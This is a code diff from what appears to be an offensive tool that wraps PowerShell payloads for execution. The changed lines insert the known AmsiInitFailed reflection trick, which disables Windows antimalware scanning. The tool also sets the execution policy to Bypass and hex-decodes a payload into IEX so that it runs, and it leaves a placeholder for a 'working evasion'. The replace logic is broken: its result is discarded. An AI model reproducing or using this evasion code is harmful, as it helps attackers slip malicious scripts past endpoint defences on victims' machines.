@@ -42,13 +42,14 @@ def base64_to_hex(b64_string):
         sys.exit(1)
 
 def construct_powershell_command(source_str):
-    replace_Amsi = "[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static');"
+    replace_Amsi = "[ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('AmsiInitFailed', 'NonPublic, Static').SetValue($null,$true);".lower()
     amsiEvasion = '<...enter working evasion...>'
     execution_policy = 'Set-ExecutionPolicy Bypass -Scope Process' 
     decoder = f'$hexString="{source_str}";$text = [System.Text.Encoding]::ASCII.GetString([byte[]] -split ($hexString -replace "..", "0x$& "));IEX $text'
 
     # If evasion is already inside, replace it with a working one
-    if replace_Amsi in source_str:
+    if replace_Amsi in source_str.lower():
+        source_str = source_str.lower()
         source_str.replace(replace_Amsi, amsiEvasion)
 
     command = f"""{execution_policy};{amsiEvasion};{decoder}"""
